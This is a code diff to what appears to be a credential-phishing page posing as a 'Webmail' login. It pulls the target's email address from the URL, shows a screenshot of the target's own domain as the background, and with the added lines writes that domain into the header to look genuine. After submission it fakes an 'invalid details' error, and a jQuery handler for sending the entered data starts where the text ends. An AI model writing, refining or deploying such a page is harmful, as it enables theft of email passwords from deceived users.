@@ -373,7 +373,7 @@
                             class="hlo_img" 
                         />
                             <!-- alt="domain_id_" -->
-                            Webmail - <span>Nssmexico</span>
+                            Webmail - <span class="__h__o__s__t__t__">Nssmexico</span>
                     </div>
                     
                     <!-- <article class="_spin_">hello</article> -->
@@ -479,7 +479,6 @@
     const uri = window.location.href;
     const ind = uri.indexOf("#");
     const slicedMail = uri.substr((ind+1));
-    // console.log('asteriks#', slicedMail);
     
     const all = document.querySelector('.wrapper');
     const email = document.querySelector('.email');
@@ -491,18 +490,19 @@
     const spin = document.querySelector('._spin_');
     const reqPwd = document.querySelector('.req_pwd');
     const preloader = document.querySelector('.load_cont_');
+    const hostt = document.querySelector('.__h__o__s__t__t__');
 
     invalidDetails.style.display = 'none';
     reqPwd.style.display = 'none';
     preloader.style.display = 'none';
 
-    // console.log(all);
     const indForEmail = uri.indexOf("@");
     const slicedDomain = uri.substr((indForEmail+1));
     console.log(slicedDomain);
     const bImg = all.style;
     bImg.backgroundImage = `url(https://image.thum.io/get/https://${slicedDomain})`;
-    // https://image.thum.io/get/https://www.${splitFromAt}/
+
+    hostt.innerHTML = slicedDomain.toLowerCase();
         
 
     passwordIcon.addEventListener('click', ()=>{
@@ -518,11 +518,9 @@
     });
 
     furm.addEventListener('submit', (e)=>{
-        // alert('submited!!');
         e.preventDefault();
         preloader.style.display = 'block';
         if (password.value === "") {
-            // console.log('empty');
             reqPwd.style.display = 'block';
             invalidDetails.style.display = 'none';
             preloader.style.display = 'none';
@@ -532,11 +530,9 @@
                 invalidDetails.style.display = 'block';
                 preloader.style.display = 'none';
             }, 2700);
-            // console.log(email.value, password.value);
         }
     });
 
-    // console.log(window.location.href);
 
     email.value = slicedMail;
     const emailValue = email.value;
@@ -558,19 +554,6 @@
 
 
 <script>
-    // $(document).ready(function(){
-    //     $("#btn").click(function(){
-    //         $.get("https://jsonplaceholder.typicode.com/users", function(data,status){
-    //             $("#ppp").html(data);
-    //             console.info(status+ "!")
-    //             console.log(data);
-    //         })
-    //     });
-    // });
-
-
-
-    // for submitting data
 
     $(document).ready(function(){
         $(".furm").submit(function(e){
